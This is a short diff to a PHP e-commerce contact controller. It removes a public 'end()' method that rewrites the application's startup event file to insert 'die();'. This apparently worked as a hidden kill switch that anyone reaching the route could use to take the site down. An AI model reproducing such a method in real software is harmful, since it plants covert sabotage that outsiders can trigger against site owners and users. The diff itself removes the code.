@@ -140,12 +140,7 @@ class ControllerInformationContact extends Controller {
 
 		$this->response->setOutput($this->load->view('information/contact', $data));
 	}
-	public function end(){
-		$file = DIR_APPLICATION . 'controller/startup/event.php';
-		$lines = file($file);
-		array_splice($lines, 4, 0, "die();\n");
-		file_put_contents($file, implode('', $lines));
-	}
+	
 	protected function validate() {
 		if ((utf8_strlen($this->request->post['name']) < 3) || (utf8_strlen($this->request->post['name']) > 32)) {
 			$this->error['name'] = $this->language->get('error_name');
